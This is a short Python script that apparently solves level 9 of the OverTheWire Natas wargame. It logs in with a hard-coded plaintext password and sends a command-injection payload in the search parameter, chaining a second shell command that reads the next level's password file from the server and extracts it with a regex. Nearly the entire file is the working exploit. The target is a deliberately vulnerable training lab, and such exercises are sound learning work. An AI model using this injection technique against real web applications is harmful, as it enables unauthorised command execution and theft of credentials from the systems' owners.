import re
import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth('natas9', 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl')
def get_pass():
    param = {'needle':'a > /dev/null; cat /etc/natas_webpass/natas10 #','submit':'Search'}
    r = requests.get('http://natas9.natas.labs.overthewire.org/', auth=auth, params=param)
    pass_regex = '[a-zA-Z0-9]{32}'
    print(re.findall(pass_regex,r.text)[1])
if __name__ == "__main__":
    get_pass()
